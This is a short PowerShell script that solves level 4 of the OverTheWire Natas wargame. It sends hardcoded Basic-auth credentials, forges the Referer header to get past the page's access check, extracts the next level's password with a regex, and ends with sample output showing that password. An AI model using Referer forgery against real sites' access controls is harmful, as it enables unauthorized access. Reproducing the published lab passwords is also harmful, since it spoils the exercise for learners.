<#

Script to retrieve the password of level 4-5

#>
$url = "http://natas4.natas.labs.overthewire.org "
$creds = "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"; referer =  "http://natas5.natas.labs.overthewire.org/" }

#We visit the page and get this message 
<#Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
#>
#We know it is something about the referrer header. So we tweak it
Invoke-WebRequest -uri $url -Method Get -Headers $headers -Proxy "http://localhost:8080" -Outfile temp.text
get-content ./temp.text | Select-String -pattern "(\w{20,})" > res #Redumbdant but meh!!
$a = (get-content res).split("\n")
del ./temp.text 
$myPass =($a[2].split(" "))
$user = $myPass[5]
$myPass = $myPass[$myPass.length -1]
# Write-host $a
echo "The password for $user is $myPass"


remove-Item res


<# PS /home/voltron/OTW/natas/pshell_lang>  ./natas5.ps1 
The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
PS /home/voltron/OTW/natas/pshell_lang>                                                                                                                         #>
